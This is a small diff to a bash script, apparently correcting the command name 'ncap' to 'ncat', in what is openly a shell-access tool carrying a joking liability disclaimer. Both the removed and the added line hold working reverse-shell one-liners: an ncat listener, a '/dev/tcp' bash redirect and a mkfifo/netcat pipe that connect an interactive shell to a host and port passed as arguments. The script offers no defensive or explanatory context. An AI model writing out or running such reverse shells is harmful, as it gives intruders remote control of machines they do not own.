@@ -1,3 +1,3 @@
 #! /bin/bash
 #! do not do bad things i am not liable etc etc
-ncap -l -p $1 || $(/bin/bash -i >& /dev/tcp/$2/$1) 0>&1 || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $2 $1 >/tmp/f
+ncat -l -p $1 || $(/bin/bash -i >& /dev/tcp/$2/$1) 0>&1 || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $2 $1 >/tmp/f
